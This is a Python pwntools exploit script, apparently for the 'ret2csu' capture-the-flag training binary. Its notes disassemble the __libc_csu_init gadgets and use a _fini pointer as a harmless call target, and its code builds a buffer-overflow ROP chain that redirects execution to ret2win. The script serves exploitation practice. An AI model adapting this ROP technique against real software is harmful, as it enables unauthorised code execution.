#!/usr/bin/env python
"""
rsp found at offset: 40
1
0000000000400840 <__libc_csu_init>:

    400880:   4c 89 fa                mov    rdx,r15
    400883:   4c 89 f6                mov    rsi,r14
    400886:   44 89 ef                mov    edi,r13d
    400889:   41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
    40088d:   48 83 c3 01             add    rbx,0x1
    400891:   48 39 dd                cmp    rbp,rbx
    400894:   75 ea                   jne    400880 <__libc_csu_init+0x40>
    400896:   48 83 c4 08             add    rsp,0x8
    40089a:   5b                      pop    rbx
    40089b:   5d                      pop    rbp
    40089c:   41 5c                   pop    r12
    40089e:   41 5d                   pop    r13
    4008a0:   41 5e                   pop    r14
    4008a2:   41 5f                   pop    r15
    4008a4:   c3                      ret    

Can't simply make r12 00000000004007b1 <ret2win> since it dereferences r12 for the call

Couldn't find write gadgets either

So maybe there's a meaningless call we can make to return?

    https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html

        00000000004008b4 <_fini>:
          4008b4:   48 83 ec 08             sub    rsp,0x8
          4008b8:   48 83 c4 08             add    rsp,0x8
          4008bc:   c3                      ret    

        Dynamic section at offset 0xe20 contains 24 entries:
          Tag        Type                         Name/Value
         0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
         0x000000000000000c (INIT)               0x400560
         0x000000000000000d (FINI)               0x4008b4

        gdb-peda$ x/10x 0x0000000000600e20
        0x600e20:   0x0000000000000001  0x0000000000000001
        0x600e30:   0x000000000000000c  0x0000000000400560
        0x600e40:   0x000000000000000d  0x00000000004008b4
        0x600e50:   0x0000000000000019  0x0000000000600e10
        0x600e60:   0x000000000000001b  0x0000000000000008
        
        gdb-peda$ x/x 0x600e48
        0x600e48:   0x00000000004008b4


"""

from pwn import *

n = p64(0)

ret2win = p64(0x00000000004007b1)
magic = p64(0xdeadcafebabebeef)
# Meaningless call just to prevent code from SIGSEGVing
fini_dereference = p64(0x600e48)
fini = p64(0x00000000004008b4)
# Needs to be 1 so that jne on __libc_csu_init isn't taken
rbp = p64(1)

payload = "A"*40 
#          csu gadget1     rbx rbp   r12                r13 r14 r15
payload += p64(0x40089a) + n + rbp + fini_dereference + n + n + magic
#          csu gadget2
payload += p64(0x400880) + n + n + n + n + n + n + n + ret2win


p = process('./ret2csu')
# p = gdb.debug('./ret2csu', 'break *0x400829')

p.recvuntil(">")
p.sendline(payload)
print p.readall()
# p.interactive()